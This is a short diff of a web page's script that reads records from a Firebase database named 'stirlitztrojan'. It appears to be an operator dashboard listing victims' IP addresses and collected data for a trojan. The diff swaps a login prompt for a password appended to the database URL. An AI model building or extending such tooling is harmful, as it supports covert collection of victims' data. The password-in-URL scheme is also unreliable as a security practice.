@@ -23,28 +23,9 @@
     <p>Copyright 2016 "I"</p>
     <script>
     <!--
-    /*
-    var email = prompt("Email:");
-    var password = prompt("Password:");
-    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/");
-    firebase.authWithPassword({email: email, password: password}, function(error, authData) {
-      if (error) console.log("Login Failed!", error);
-      else{
-        
-      }
-    });
-    */
-    
-    
-    
-    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/");
+    var firebase = new Firebase("https://stirlitztrojan.firebaseio.com/" + prompt("Password:"));
     var rows, color;
-    firebase.once("value", function(snapshot) {
-      /*
-      rows = snapshot.child("info");
-      if(rows["pas"].val()==prompt(""));
-      */
-      
+    firebase.once("value", function(snapshot) {/*
       rows = snapshot.child("user");
       color = "#cccccc";
       rows.forEach(function(row){
@@ -66,6 +47,10 @@
         tableCellIp.className = "nowrapword";
         tableCellIp.innerHTML = ip;
       });
+      */
+      
+      
+      
       rows = snapshot.child("data");
       color = "#cccccc";
       rows.forEach(function(row){
